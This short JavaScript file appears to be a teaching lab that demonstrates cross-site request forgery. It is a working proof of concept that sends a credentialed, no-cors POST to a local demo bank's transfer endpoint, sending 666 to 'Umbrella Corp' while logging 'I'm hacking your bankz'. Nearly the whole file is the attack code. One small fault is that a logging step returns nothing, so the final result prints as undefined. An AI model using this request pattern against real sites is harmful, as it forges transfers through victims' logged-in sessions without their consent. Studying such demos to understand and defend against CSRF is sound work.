console.log("I'm hacking your bankz");

function validateResponse(response) {
  if (!response.ok) {
    throw Error(response.statusText);
  }
  return response;
}

function readResponseAsText(response) {
  // TODO 4b
  return response.text();
}

function logHeaders(response) {
  let headers = response.headers;
  for (var header of headers.keys()) {
    console.log(header);
  }
  for (var header of headers.values()) {
    console.log(header);
  }
}

function logResult(result) {
  console.log(result);
}

function logError(error) {
  console.log('Looks like there was a problem: \n', error);
}

fetch('http://bank.127.0.0.1.xip.io:8080/transfer?recipient=Umbrella+Corp&amount=666', {
  method: 'POST',
  credentials: 'include',
  mode: 'no-cors'
})
.then(validateResponse)
.then(readResponseAsText)
.then(logHeaders)
.then(logResult)
.catch(logError);

console.log('Hacking finizhed');
